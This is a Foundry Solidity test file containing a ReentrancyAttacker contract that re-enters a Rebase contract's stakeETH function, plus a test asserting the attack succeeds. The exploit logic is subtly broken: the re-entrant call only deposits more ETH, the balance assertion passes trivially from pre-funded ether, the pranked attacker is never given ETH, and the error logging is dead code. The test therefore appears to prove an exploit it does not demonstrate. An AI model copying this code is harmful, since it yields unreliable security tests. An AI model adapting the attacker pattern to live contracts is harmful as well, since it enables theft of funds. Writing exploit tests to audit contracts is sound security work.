// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../src/Rebase.sol"; // Adjust the import path as needed

contract MockERC20 is ERC20 {
    constructor() ERC20("Mock Token", "MOCK") {}

    function mint(address to, uint256 amount) public {
        _mint(to, amount);
    }
}

contract ReentrancyAttacker {
    Rebase public rebase;
    MockERC20 public token;

    constructor(Rebase _rebase, MockERC20 _token) {
        rebase = _rebase;
        token = _token;
    }

    // Fallback function to trigger reentrancy
    receive() external payable {
        if (address(rebase).balance >= 1 ether) {
            address[] memory apps = new address[](0);
            rebase.stakeETH{value: 1 ether}(apps);
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether, "Need at least 1 ether to attack");

        // Start the attack by staking Ether
        address[] memory apps = new address[](0);
        rebase.stakeETH{value: 1 ether}(apps);
    }
}

contract RebaseTest is Test {
    Rebase rebase;
    MockERC20 token;
    ReentrancyAttacker attackerContract;
    address attacker;

    function setUp() public {
        // Deploy the Rebase contract
        rebase = new Rebase();

        // Deploy a mock ERC20 token contract
        token = new MockERC20();

        // Deploy the reentrancy attacker contract
        attackerContract = new ReentrancyAttacker(rebase, token);

        // Mint tokens to the attacker address
        attacker = address(0xBEEF);
        token.mint(attacker, 100 ether);

        // Label addresses for better readability in the test output
        vm.label(address(rebase), "Rebase");
        vm.label(address(token), "Token");
        vm.label(attacker, "Attacker");
        vm.label(address(attackerContract), "ReentrancyAttacker");

        // Fund the attacker contract with some Ether
        vm.deal(address(attackerContract), 10 ether);
    }

    function testReentrancyAttack() public {
        vm.startPrank(attacker);

        // Perform the reentrancy attack
        (bool success, bytes memory data) = address(attackerContract).call{
            value: 1 ether
        }(abi.encodeWithSignature("attack()"));

        vm.stopPrank();

        // Check for success
        require(success, "Reentrancy attack failed");

        // Log the error data if any
        if (!success) {
            emit log_bytes(data);
        }

        // Assert that the reentrancy attack was successful
        assertGt(
            address(attackerContract).balance,
            1 ether,
            "Reentrancy attack failed"
        );
    }
}
